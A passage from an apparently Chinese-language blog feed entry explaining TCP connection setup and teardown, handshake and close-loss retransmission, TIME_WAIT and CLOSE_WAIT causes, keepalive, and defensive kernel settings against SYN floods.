remotehost, remoteport)</code>。</p><ul><li><code>M</code> 是一个计时器，这个计时器每隔 4 微秒加 1。</li><li><code>F</code> 是一个 Hash 算法，根据源 IP、目的IP、源端口、目的端口生成一个随机数值。要保证 Hash算法不能被外部轻易推算得出，用 MD5 算法是一个比较好的选择。</li></ul><p>可以看到，随机数是会基于时钟计时器递增的，基本不可能会随机成一样的初始化序列号。</p><h2 id="既然-ip-层会分片为什么-tcp-层还需要-mss-呢">2.6 既然 IP层会分片，为什么 TCP 层还需要 MSS 呢？</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518190.png"alt="image-20240416151111857" /><figcaption aria-hidden="true">image-20240416151111857</figcaption></figure><ul><li><code>MTU</code>：一个网络包的最大长度，以太网中一般为<code>1500</code> 字节；</li><li><code>MSS</code>：除去 IP 和 TCP 头部之后，一个网络包所能容纳的 TCP数据的最大长度；</li></ul><p>假设有一份较大的数据，且在TCP层不分段，如果这份数据在发送的过程中出现<strong>丢包</strong>现象，TCP会发生重传，那么重传的就是这一大份数据（虽然IP层会把数据切分为MTU长度的N多个小包，但是TCP重传的单位却是那一大份数据）。如果TCP把这份数据，分段为N个小于等于MSS长度的数据包，到了IP层后加上IP头和TCP头，还是小于MTU，那么IP层也不会再进行分包。此时在传输路上发生了丢包，那么TCP重传的时候也只是重传那一小部分的MSS段。效率会比TCP不分段时更高。</p><h2 id="第一次握手丢失了会发生什么">2.7第一次握手丢失了，会发生什么？</h2><p>当客户端想和服务端建立 TCP 连接的时候，首先第一个发的就是 SYN报文，然后进入到 <code>SYN_SENT</code>状态。在这之后，如果客户端迟迟收不到服务端的 SYN-ACK报文（第二次握手），就会触发<strong>超时重传</strong>机制，重传 SYN报文，而且重传的 <strong>SYN报文的序列号</strong>都是<strong>一样</strong>的。不同版本的操作系统可能超时时间不同，有的1 秒的，也有 3秒的，这个超时时间是写死在内核里的，如果想要更改则需要重新编译内核，比较麻烦。当客户端在1 秒后没收到服务端的 SYN-ACK 报文后，客户端就会重发 SYN报文，那到底重发几次呢？在 Linux 里，客户端的 SYN 报文最大重传次数由<code>tcp_syn_retries</code>内核参数控制，这个参数是可以自定义的，默认值一般是5。</p><p>通常，第一次超时重传是在 1 秒后，第二次超时重传是在 2秒，第三次超时重传是在 4 秒后，第四次超时重传是在 8秒后，第五次是在超时重传 16 秒后。<strong>每次超时的时间是上一次的 2倍</strong>。当第五次超时重传后，会继续等待 32秒，如果服务端仍然没有回应 ACK，客户端就不再发送 SYN 包，然后断开 TCP连接。所以，总耗时是 1+2+4+8+16+32=63 秒，大约 1分钟左右。举个例子，假设 <code>tcp_syn_retries</code> 参数值为3，那么当客户端的 SYN 报文一直在网络中丢失时，会发生下图的过程：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518191.png"alt="image-20240416152144803" /><figcaption aria-hidden="true">image-20240416152144803</figcaption></figure><p>注：RTO：retransmission timeout</p><h2 id="第二次握手丢失了会发生什么">2.8第二次握手丢失了，会发生什么？</h2><p>当服务端收到客户端的第一次握手后，就会回 SYN-ACK报文给客户端，这个就是第二次握手，此时服务端会进入 <code>SYN_RCVD</code>状态。第二次握手的 <code>SYN-ACK</code> 报文有两个作用 ：</p><ul><li>ACK：对第一次握手的确认报文；</li><li>SYN：服务端发起建立 TCP 连接的报文；</li></ul><p>因为第二次握手报文里是包含对客户端的第一次握手的 ACK确认报文，所以，如果客户端迟迟没有收到第二次握手，那么客户端就觉得可能是自己的SYN报文（第一次握手）丢失了，于是<strong>客户端就会触发超时重传机制，重传SYN 报文</strong>。然后，因为第二次握手中包含服务端的 SYN报文，所以当客户端收到后，需要给服务端发送 ACK确认报文（第三次握手），服务端才会认为该 SYN报文被客户端收到了。那么，如果第二次握手丢失了，服务端就收不到第三次握手，于是<strong>服务端这边会触发超时重传机制，重传SYN-ACK 报文</strong>。在 Linux 下，SYN-ACK 报文的最大重传次数由<code>tcp_synack_retries</code>内核参数决定，默认值是5。因此，当第二次握手丢失了，客户端和服务端都会重传：</p><ul><li>客户端会重传 SYN 报文，也就是第一次握手，最大重传次数由<code>tcp_syn_retries</code>内核参数决定；</li><li>服务端会重传 SYN-ACK 报文，也就是第二次握手，最大重传次数由<code>tcp_synack_retries</code> 内核参数决定。</li></ul><p>假设 <code>tcp_syn_retries</code> 参数值为1，<code>tcp_synack_retries</code> 参数值为2，那么当第二次握手一直丢失时，发生的过程如下图：</p><ul><li>当客户端超时重传 1 次 SYN 报文后，由于 tcp_syn_retries 为1，已达到最大重传次数，于是再等待一段时间（时间为上一次超时时间的 2倍），如果还是没能收到服务端的第二次握手（SYN-ACK报文），那么客户端就会断开连接。</li><li>当服务端超时重传 2 次 SYN-ACK 报文后，由于 tcp_synack_retries 为2，已达到最大重传次数，于是再等待一段时间（时间为上一次超时时间的 2倍），如果还是没能收到客户端的第三次握手（ACK报文），那么服务端就会断开连接。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518192.png"alt="image-20240416152709699" /><figcaption aria-hidden="true">image-20240416152709699</figcaption></figure><h2 id="第三次握手丢失了会发生什么">2.9第三次握手丢失了，会发生什么？</h2><p>客户端收到服务端的 SYN-ACK 报文后，就会给服务端回一个 ACK报文，也就是第三次握手，此时客户端状态进入到 <code>ESTABLISH</code>状态。因为这个第三次握手的 ACK 是对第二次握手的 SYN的确认报文，所以当第三次握手丢失了，如果服务端那一方迟迟收不到这个确认报文，就会触发超时重传机制，重传SYN-ACK 报文，直到收到第三次握手，或者达到最大重传次数。注：<strong>ACK报文没有重传机制，当 ACK 丢失了，就由对方重传对应的报文</strong>。</p><p>举个例子，假设 tcp_synack_retries 参数值为2，那么当第三次握手一直丢失时，发生的过程如下图：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518193.png"alt="image-20240416153133870" /><figcaption aria-hidden="true">image-20240416153133870</figcaption></figure><h2 id="syn-攻击">2.10 SYN 攻击</h2><h3 id="原理">2.10.1 原理</h3><p>TCP 连接建立是需要三次握手，假设攻击者短时间伪造不同 IP 地址的<code>SYN</code> 报文，服务端每接收到一个 <code>SYN</code>报文，就进入<code>SYN_RCVD</code> 状态，但服务端发送出去的<code>ACK + SYN</code> 报文，无法得到未知 IP 主机的 <code>ACK</code>应答，久而久之就会<strong>占满服务端的半连接队列</strong>，使得服务端不能为正常用户服务。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518194.png"alt="image-20240416153305481" /><figcaption aria-hidden="true">image-20240416153305481</figcaption></figure><p>在 TCP 三次握手的时候，Linux 内核会维护两个队列，分别是：</p><ul><li>半连接队列，也称 SYN 队列；</li><li>全连接队列，也称 accept 队列；</li></ul><p>Linux 内核的 <code>SYN</code> 队列（半连接队列）与<code>Accpet</code> 队列（全连接队列）工作流程如下：</p><ul><li>当服务端接收到客户端的 SYN报文时，会创建一个半连接的对象，然后将其加入到内核的「 SYN 队列」；</li><li>接着发送 SYN + ACK 给客户端，等待客户端回应 ACK 报文；</li><li>服务端接收到 ACK 报文后，从「 SYN队列」取出一个半连接对象，然后创建一个新的连接对象放入到「 Accept队列」；</li><li>应用通过调用 <code>accpet()</code> socket 接口，从「 Accept队列」取出连接对象。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518195.png"alt="image-20240416153359046" /><figcaption aria-hidden="true">image-20240416153359046</figcaption></figure><p>不管是半连接队列还是全连接队列，都有最大长度限制，超过限制时，默认情况都会丢弃报文。SYN攻击方式最直接的表现就会把 TCP 半连接队列占满，这样<strong>当 TCP半连接队列满了，后续再在收到 SYN报文就会丢弃</strong>，导致客户端无法和服务端建立连接。</p><h3 id="应对措施">2.10.2 应对措施</h3><p>避免 SYN 攻击方式，可以有以下四种方法：</p><ul><li>调大 netdev_max_backlog；</li><li>增大 TCP 半连接队列；</li><li>开启 tcp_syncookies；</li><li>减少 SYN+ACK 重传次数</li></ul><h4 id="调大-netdev_max_backlog">2.10.2.1 调大 netdev_max_backlog</h4><p>当网卡接收数据包的速度大于内核处理的速度时，会有一个队列保存这些数据包。控制该队列的最大值如下参数，默认值是1000，我们可以适当调大该参数的值，比如设置为 10000：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net.core.netdev_max_backlog = 10000<br></code></pre></td></tr></table></figure><h4 id="增大-tcp-半连接队列">2.10.2.2 增大 TCP 半连接队列</h4><p>增大 TCP 半连接队列，要同时增大下面这三个参数：</p><ul><li>增大 net.ipv4.tcp_max_syn_backlog</li><li>增大 listen() 函数中的 backlog</li><li>增大 net.core.somaxconn</li></ul><h4 id="开启-net.ipv4.tcp_syncookies">2.10.2.3 开启net.ipv4.tcp_syncookies</h4><p>开启 syncookies 功能就可以在不使用 SYN半连接队列的情况下成功建立连接，相当于绕过了 SYN半连接来建立连接。具体过程：</p><ul><li>当 「 SYN 队列」满之后，后续服务端收到 SYN包，不会丢弃，而是根据算法，计算出一个 <code>cookie</code> 值；</li><li>将 cookie值放到第二次握手报文的「序列号」里，然后服务端回第二次握手给客户端；</li><li>服务端接收到客户端的应答报文时，服务端会检查这个 ACK包的合法性。如果合法，将该连接对象放入到「 Accept 队列」。</li><li>最后应用程序通过调用 <code>accpet()</code> 接口，从「 Accept队列」取出的连接。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518196.png"alt="image-20240416153729271" /><figcaption aria-hidden="true">image-20240416153729271</figcaption></figure><p>当开启了 tcp_syncookies 了，即使受到 SYN 攻击而导致 SYN队列满时，也能保证正常的连接成功建立。net.ipv4.tcp_syncookies参数主要有以下三个值：</p><ul><li>0：表示关闭该功能；</li><li>1：表示仅当 SYN 半连接队列放不下时，再启用它；</li><li>2 ：表示无条件开启功能；</li></ul><p>那么在应对 SYN 攻击时，只需要设置为 1 即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/tcp_syncookies<br></code></pre></td></tr></table></figure><h4 id="减少-synack-重传次数">2.10.2.4 减少 SYN+ACK 重传次数</h4><p>当服务端受到 SYN 攻击时，就会有大量处于 SYN_REVC 状态的 TCP连接，处于这个状态的 TCP 会重传 SYN+ACK，当重传超过次数达到上限后，就会断开连接。那么针对 SYN攻击的场景，我们可以减少 SYN-ACK 的重传次数，以加快处于 SYN_REVC 状态的TCP 连接断开。SYN-ACK 报文的最大重传次数由<code>tcp_synack_retries</code>内核参数决定（默认值是 5 次），比如将<code>tcp_synack_retries</code> 减少到 2 次：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> 2 &gt; /proc/sys/net/ipv4/tcp_synack_retries</span><br></code></pre></td></tr></table></figure><h1 id="连接断开">3. 连接断开</h1><h2 id="四次挥手过程">3.1 四次挥手过程</h2><p>双方都可以主动断开连接，断开连接后主机中的「资源」将被释放，四次挥手的过程如下图所示：</p><ul><li>客户端打算关闭连接，此时会发送一个 TCP 首部 <code>FIN</code>标志位被置为 <code>1</code> 的报文，也即 <code>FIN</code>报文，之后客户端进入 <code>FIN_WAIT_1</code> 状态。</li><li>服务端收到该报文后，就向客户端发送 <code>ACK</code>应答报文，接着服务端进入 <code>CLOSE_WAIT</code> 状态。</li><li>客户端收到服务端的 <code>ACK</code> 应答报文后，之后进入<code>FIN_WAIT_2</code> 状态。</li><li>等待服务端处理完数据后，也向客户端发送 <code>FIN</code>报文，之后服务端进入 <code>LAST_ACK</code> 状态。</li><li>客户端收到服务端的 <code>FIN</code> 报文后，回一个 <code>ACK</code>应答报文，之后进入 <code>TIME_WAIT</code> 状态</li><li>服务端收到了 <code>ACK</code> 应答报文后，就进入了<code>CLOSE</code> 状态，至此服务端已经完成连接的关闭。</li><li>客户端在经过 <code>2MSL(Maximum Segment Lifetime)</code>一段时间后，自动进入 <code>CLOSE</code>状态，至此客户端也完成连接的关闭。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518197.png"alt="image-20240417140509771" /><figcaption aria-hidden="true">image-20240417140509771</figcaption></figure><p>注意：<strong>主动关闭连接的，才有 TIME_WAIT 状态。</strong></p><h2 id="为什么需要四次挥手">3.2 为什么需要四次挥手？</h2><ul><li>关闭连接时，客户端向服务端发送 <code>FIN</code>时，仅仅表示客户端不再发送数据了但是还能接收数据。</li><li>服务端收到客户端的 <code>FIN</code> 报文时，先回一个<code>ACK</code>应答报文，而服务端可能还有数据需要处理和发送，等服务端不再发送数据时，才发送<code>FIN</code> 报文给客户端来表示同意现在关闭连接。</li></ul><p>注意：<strong>在特定情况下，四次挥手可以变成三次挥手。</strong></p><h2 id="第一次挥手丢失了会发生什么">3.3第一次挥手丢失了，会发生什么？</h2><p>当客户端（主动关闭方）调用 close 函数后，就会向服务端发送 FIN报文，试图与服务端断开连接，此时客户端的连接进入到<code>FIN_WAIT_1</code>状态。正常情况下，如果能及时收到服务端（被动关闭方）的 ACK，则会很快变为<code>FIN_WAIT2</code>状态。如果第一次挥手丢失了，那么客户端迟迟收不到被动方的ACK 的话，就会触发超时重传机制，重传 FIN 报文，重发次数由<code>tcp_orphan_retries</code> 参数控制。当客户端重传 FIN报文的次数超过 <code>tcp_orphan_retries</code> 后，就不再发送 FIN报文，则会在等待一段时间（时间为上一次超时时间的 2倍），如果还是没能收到第二次挥手，那么直接进入到 <code>close</code>状态。</p><p>假设 <code>tcp_orphan_retries</code>参数值为3，当第一次挥手一直丢失时，发生的过程如下图：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518198.png"alt="image-20240417141535286" /><figcaption aria-hidden="true">image-20240417141535286</figcaption></figure><h2 id="第二次挥手丢失了会发生什么">3.4第二次挥手丢失了，会发生什么？</h2><p>当服务端收到客户端的第一次挥手后，就会先回一个 ACK确认报文，此时服务端的连接进入到 <code>CLOSE_WAIT</code>状态。前面提到，ACK报文是不会重传的，所以如果服务端的第二次挥手丢失了，客户端就会触发超时重传机制，重传FIN 报文，直到收到服务端的第二次挥手，或者达到最大的重传次数。</p><p>假设 tcp_orphan_retries 参数值为2，当第二次挥手一直丢失时，发生的过程如下图：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518199.png"alt="image-20240417141456300" /><figcaption aria-hidden="true">image-20240417141456300</figcaption></figure><p>当客户端收到第二次挥手，也就是收到服务端发送的 ACK报文后，客户端就会处于 <code>FIN_WAIT2</code>状态，在这个状态需要等服务端发送第三次挥手，也就是服务端的 FIN报文。对于 close函数关闭的连接，由于无法再发送和接收数据，所以<code>FIN_WAIT2</code>状态不可以持续太久，而 <code>tcp_fin_timeout</code>控制了这个状态下连接的持续时长，默认值是 60 秒。这意味着对于调用 close关闭的连接，如果在 60 秒后还没有收到 FIN报文，客户端（主动关闭方）的连接就会直接关闭，如下图：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518200.png"alt="image-20240417141916449" /><figcaption aria-hidden="true">image-20240417141916449</figcaption></figure><p>但是如果主动关闭方使用 shutdown函数关闭连接，指定了只关闭发送方向，而接收方向并没有关闭，那么意味着主动关闭方还是可以接收数据的。此时，如果主动关闭方一直没收到第三次挥手，那么主动关闭方的连接将会一直处于<code>FIN_WAIT2</code> 状态（<code>tcp_fin_timeout</code> 无法控制shutdown 关闭的连接）。如下图：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518201.png"alt="image-20240417142026112" /><figcaption aria-hidden="true">image-20240417142026112</figcaption></figure><h2 id="第三次挥手丢失了会发生什么">3.5第三次挥手丢失了，会发生什么？</h2><p>当服务端（被动关闭方）收到客户端（主动关闭方）的 FIN报文后，内核会自动回复 ACK，同时连接处于 <code>CLOSE_WAIT</code>状态，顾名思义，它表示等待应用进程调用 close函数关闭连接。此时，内核没有权利替代进程关闭连接，必须由进程主动调用close 函数来触发服务端发送 FIN 报文。一旦调用了 close 函数，内核就会发出FIN 报文，同时连接进入 LAST_ACK 状态，等待客户端返回 ACK来确认连接关闭。如果迟迟收不到这个 ACK，服务端就会重发 FIN报文，重发次数仍然由 <code>tcp_orphan_retries</code>参数控制，这与客户端重发 FIN 报文的重传次数控制方式是一样的。</p><p>假设 <code>tcp_orphan_retrie</code>s =3，当第三次挥手一直丢失时，发生的过程如下图：</p><ul><li>当服务端重传第三次挥手报文的次数达到了 3 次后，由于tcp_orphan_retries 为3，达到了重传最大次数，于是再等待一段时间（时间为上一次超时时间的 2倍），如果还是没能收到客户端的第四次挥手（ACK报文），那么服务端就会断开连接。</li><li>客户端因为是通过 close 函数关闭连接的，处于 FIN_WAIT_2状态是有时长限制的，如果 tcp_fin_timeout时间内还是没能收到服务端的第三次挥手（FIN报文），那么客户端就会断开连接。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518202.png"alt="image-20240417142404245" /><figcaption aria-hidden="true">image-20240417142404245</figcaption></figure><h2 id="第四次挥手丢失了会发生什么">3.6第四次挥手丢失了，会发生什么？</h2><p>当客户端收到服务端的第三次挥手的 FIN 报文后，就会回 ACK报文，也就是第四次挥手，此时客户端连接进入 <code>TIME_WAIT</code>状态。在 Linux 系统，TIME_WAIT 状态会持续 2MSL后才会进入关闭状态。然后，服务端（被动关闭方）没有收到 ACK报文前，还是处于 LAST_ACK 状态。如果第四次挥手的 ACK报文没有到达服务端，服务端就会重发 FIN 报文，重发次数仍然由前面介绍过的<code>tcp_orphan_retries</code> 参数控制。</p><p>假设 tcp_orphan_retries 为2，当第四次挥手一直丢失时，发生的过程如下：</p><ul><li>当服务端重传第三次挥手报文达到 2 时，由于 tcp_orphan_retries 为 2，达到了最大重传次数，于是再等待一段时间（时间为上一次超时时间的 2倍），如果还是没能收到客户端的第四次挥手（ACK报文），那么服务端就会断开连接。</li><li>客户端在收到第三次挥手后，就会进入 TIME_WAIT 状态，开启时长为 2MSL的定时器，如果途中再次收到第三次挥手（FIN报文）后，就会重置定时器，当等待 2MSL 时长后，客户端就会断开连接。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518203.png"alt="image-20240417142701360" /><figcaption aria-hidden="true">image-20240417142701360</figcaption></figure><h2 id="为什么-time_wait-等待的时间是-2msl">3.7 为什么 TIME_WAIT等待的时间是 2MSL？</h2><p>MSL是Maximum SegmentLifetime英文的缩写，中文可以译为“报文最大生存时间”，它是任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃。因为tcp报文（segment）是ip数据报（datagram）的数据部分，，而ip头中有一个TTL域，TTL是timetolive的缩写，中文可以译为“生存时间”，这个生存时间是由源主机设置初始值但不是存活的具体时间，而是存储了一个ip数据报可以经过的最大路由数，每经过一个处理他的路由器此值就减1，当此值为0则数据报将被丢弃，同时发送ICMP报文通知源主机。RFC793中规定MSL为2分钟，实际应用中常用的是30秒，1分钟和2分钟等。</p><p>MSL 与 TTL 的区别： MSL 的单位是时间，而 TTL 是经过路由跳数。 MSL应该要<strong>大于等于</strong> TTL 消耗为 0的时间，以确保报文已被自然消亡。</p><p>2MSL即两倍的MSL，TCP的TIME_WAIT状态也称为2MSL等待状态，当TCP的一端发起主动关闭，在发出最后一个ACK包后，即第3次挥手完成后发送了第四次挥手的ACK包后就进入了TIME_WAIT状态，必须在此状态上停留两倍的MSL时间，等待2MSL时间主要目的是怕最后一个ACK包对方没收到，那么对方在超时后将重发第三次握手的FIN包，主动关闭端接到重发的FIN包后可以再发一个ACK应答包。此时对2MSL定时器进行重置。</p><h2 id="为什么需要-time_wait-状态">3.8 为什么需要 TIME_WAIT 状态？</h2><p>主动发起关闭连接的一方，才会有 <code>TIME-WAIT</code> 状态。需要TIME-WAIT 状态，主要是两个原因：</p><ul><li>防止历史连接中的数据，被后面相同四元组的连接错误的接收；</li><li>保证「被动关闭连接」的一方，能被正确的关闭；</li></ul><h3 id="原因1">3.8.1 原因1</h3><ul><li><strong>序列号</strong>，是 TCP 一个头部字段，标识了 TCP 发送端到TCP 接收端的数据流的一个字节，因为 TCP是面向字节流的可靠协议，为了保证消息的顺序性和可靠性，TCP为每个传输方向上的每个字节都赋予了一个编号，以便于传输成功后确认、丢失后重传以及在接收端保证不会乱序。<strong>序列号是一个32 位的无符号数，因此在到达 4G 之后再循环回到 0</strong>。</li><li><strong>初始序列号</strong>，在 TCP建立连接的时候，客户端和服务端都会各自生成一个初始序列号，它是基于时钟生成的一个随机数，来保证每个连接都拥有不同的初始序列号。<strong>初始化序列号可被视为一个32 位的计数器，该计数器的数值每 4 微秒加 1，循环一次需要 4.55小时</strong>。</li></ul><p>下图中的 Seq就是序列号，其中红色框住的分别是客户端和服务端各自生成的初始序列号。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518204.png"alt="image-20240417145335933" /><figcaption aria-hidden="true">image-20240417145335933</figcaption></figure><p><strong>序列号和初始化序列号并不是无限递增的，会发生回绕为初始值的情况，这意味着无法根据序列号来判断新老数据</strong>。假设TIME-WAIT 没有等待时间或时间过短，被延迟的数据包抵达后会发生什么呢？</p><ul><li>服务端在关闭连接之前发送的 <code>SEQ = 301</code>报文，被网络延迟了。</li><li>接着，服务端以相同的四元组重新打开了新连接，前面被延迟的<code>SEQ = 301</code>这时抵达了客户端，而且该数据报文的序列号刚好在客户端接收窗口内，因此客户端会正常接收这个数据报文，但是这个数据报文是上一个连接残留下来的，这样就产生数据错乱等严重的问题。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518205.png"alt="image-20240417145433035" /><figcaption aria-hidden="true">image-20240417145433035</figcaption></figure><p>为了防止历史连接中的数据，被后面相同四元组的连接错误的接收，因此 TCP设计了 TIME_WAIT 状态，状态会持续 <code>2MSL</code>时长，这个时间<strong>足以让两个方向上的数据包都被丢弃，使得原来连接的数据包在网络中都自然消失，再出现的数据包一定都是新建立连接所产生的。</strong></p><h3 id="原因2">3.8.2 原因2</h3><p>如果客户端（主动关闭方）最后一次 ACK报文（第四次挥手）在网络中丢失了，那么按照 TCP可靠性原则，服务端（被动关闭方）会重发 FIN 报文。假设客户端没有TIME_WAIT 状态，而是在发完最后一次回 ACK 报文就直接进入 CLOSE状态，如果该 ACK 报文丢失了，服务端则重传的 FIN报文，而这时客户端已经进入到关闭状态了，在收到服务端重传的 FIN报文后，就会回 RST 报文。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518206.png"alt="image-20240417145730219" /><figcaption aria-hidden="true">image-20240417145730219</figcaption></figure><p>服务端收到这个 RST 并将其解释为一个错误（Connection reset bypeer），这对于一个可靠的协议来说不是一个优雅的终止方式。为了防止这种情况出现，客户端必须等待足够长的时间，确保服务端能够收到ACK，如果服务端没有收到 ACK，那么就会触发 TCP重传机制，服务端会重新发送一个 FIN，这样一去一来刚好两个 MSL的时间。客户端在收到服务端重传的 FIN 报文时，TIME_WAIT状态的等待时间，会重置回 2MSL。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202404171518207.png"alt="image-20240417145818621" /><figcaption aria-hidden="true">image-20240417145818621</figcaption></figure><h2 id="time_wait-过多有什么危害">3.9 TIME_WAIT 过多有什么危害？</h2><p>过多的 TIME-WAIT 状态主要的危害有两种：</p><ul><li>第一是占用系统资源，比如文件描述符、内存资源、CPU资源、线程资源等；</li><li>第二是占用端口资源，端口资源也是有限的，一般可以开启的端口为<code>32768～61000</code>，也可以通过<code>net.ipv4.ip_local_port_range</code>参数指定范围。</li></ul><p>客户端和服务端 TIME_WAIT 过多，造成的影响是不同的。</p><p><strong>如果客户端（主动发起关闭连接方）的 TIME_WAIT状态过多</strong>，占满了所有端口资源，那么就无法对「目的 IP+ 目的PORT」都一样的服务端发起连接了，但是被使用的端口，还是可以继续对另外一个服务端发起连接的。</p><p><strong>如果服务端（主动发起关闭连接方）的 TIME_WAIT状态过多</strong>，并不会导致端口资源受限，因为服务端只监听一个端口，而且由于一个四元组唯一确定一个TCP 连接，因此理论上服务端可以建立很多连接，但是 TCP连接过多，会占用系统资源，比如文件描述符、内存资源、CPU资源、线程资源等。</p><h2 id="如何优化-time_wait">3.10 如何优化 TIME_WAIT？</h2><ul><li><code>net.ipv4.tcp_tw_reuse</code> 和<code>net.ipv4.tcp_timestamps</code>：复用处于 TIME_WAIT 的 socket为新的连接所用（只能对客户端使用）</li><li><code>net.ipv4.tcp_max_tw_buckets</code>：当系统中处于 TIME_WAIT的连接一旦超过这个值时，系统就会将后面的 TIME_WAIT 连接状态重置</li><li>程序中使用 SO_LINGER：如果<code>l_onoff</code>为非 0，且<code>l_linger</code>值为0，那么调用<code>close</code>后，会立该发送一个<code>RST</code>标志给对端，该TCP连接将跳过四次挥手，也就跳过了<code>TIME_WAIT</code>状态，直接关闭。</li></ul><h2 id="服务器出现大量-time_wait-状态的原因有哪些">3.11 服务器出现大量TIME_WAIT 状态的原因有哪些？</h2><p>TIME_WAIT状态是主动关闭连接方才会出现的状态，所以如果服务器出现大量的 TIME_WAIT状态的 TCP 连接，就是说明服务器主动断开了很多 TCP 连接。</p><ul><li>HTTP 没有使用长连接：根据大多数 Web 服务的实现，不管哪一方禁用了HTTP Keep-Alive，都是由服务端主动关闭连接，那么此时服务端上就会出现TIME_WAIT 状态的连接。</li><li>HTTP 长连接超时：假设设置了 HTTP 长连接的超时时间是 60 秒，nginx就会启动一个「定时器」，如果客户端在完后一个 HTTP 请求后，在 60秒内都没有再发起新的请求，定时器的时间一到，nginx就会触发回调函数来关闭该连接，那么此时服务端上就会出现 TIME_WAIT状态的连接。</li><li>HTTP 长连接的请求数量达到上限：Web 服务端通常会有个参数，来定义一条HTTP长连接上最大能处理的请求数量，当超过最大限制时，就会主动关闭连接。</li></ul><h2 id="服务器出现大量-close_wait-状态的原因有哪些">3.12 服务器出现大量CLOSE_WAIT 状态的原因有哪些？</h2><p>CLOSE_WAIT状态是「被动关闭方」才会有的状态，而且如果「被动关闭方」没有调用 close函数关闭连接，那么就无法发出 FIN 报文，从而无法使得 CLOSE_WAIT状态的连接转变为 LAST_ACK 状态。所以，当服务端出现大量 CLOSE_WAIT状态的连接的时候，说明<strong>服务端的程序没有调用 close函数关闭连接</strong>。</p><h2 id="如果已经建立了连接但是客户端突然出现故障了怎么办">3.13如果已经建立了连接，但是客户端突然出现故障了怎么办？</h2><p>客户端出现故障指的是客户端的主机发生了宕机，或者断电的场景。发生这种情况的时候，如果服务端一直不会发送数据给客户端，那么服务端是永远无法感知到客户端宕机这个事件的，也就是服务端的TCP 连接将一直处于 <code>ESTABLISH</code> 状态，占用着系统资源。</p><p>为了避免这种情况，TCP设计了<strong>保活机制</strong>。这个机制的原理是这样的：定义一个时间段，在这个时间段内，如果没有任何连接相关的活动，TCP保活机制会开始作用，每隔一个时间间隔，发送一个探测报文，该探测报文包含的数据非常少，如果连续几个探测报文都没有得到响应，则认为当前的TCP 连接已经死亡，系统内核将错误信息通知给上层应用程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">net.ipv4.tcp_keepalive_time=7200<br>net.ipv4.tcp_keepalive_intvl=75  <br>net.ipv4.tcp_keepalive_probes=9<br></code></pre></td></tr></table></figure><ul><li>tcp_keepalive_time=7200：表示保活时间是 7200 秒（2小时），也就 2小时内如果没有任何连接相关的活动，则会启动保活机制</li><li>tcp_keepalive_intvl=75：表示每次检测间隔 75 秒；</li><li>tcp_keepalive_probes=9：表示检测 9次无响应，认为对方是不可达的，从而中断本次的连接。</li></ul><p>TCP保活机制检测的时间是有点长，我们可以自己在应用层实现一个心跳机制。比如，web服务软件一般都会提供 <code>keepalive_timeout</code> 参数，用来指定 HTTP长连接的超时时间。如果设置了 HTTP 长连接的超时时间是 60 秒，web服务软件就会启动一个定时器，如果客户端在完成一个 HTTP 请求后，在 60秒内都没有再发起新的请求，定时器的时间一到<strong>，</strong>就会触发回调函数来释放该连接。</p><h2 id="如果已经建立了连接但是服务端的进程崩溃会发生什么">3.14如果已经建立了连接，但是服务端的进程崩溃会发生什么？</h2><p>TCP的连接信息是由内核维护的，所以当服务端的进程崩溃后，内核需要回收该进程的所有TCP 连接资源，于是内核会发送第一次挥手 FIN报文，后续的挥手过程也都是在内核完成，并不需要进程的参与，所以即使服务端的进程退出了，还是能与客户端完成TCP 四次挥手的过程。</p><p><strong>参考资料：</strong></p><ol type="1"><li>图解网络：https://xiaolincoding.com/network</li><li>动图图解！既然IP层会分片，为什么TCP层也还要分段？https://cloud.tencent.com/developer/article/1828823</li><li>什么是2MSL：https://blog.csdn.net/xiaofei0859/article/details/6044694</li></ol>]]></content>
    
    
    <categories>
      
      <category>计算机核心课程</category>
      
      <category>计算机网络</category>
      
      <category>图解网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>传输层</title>
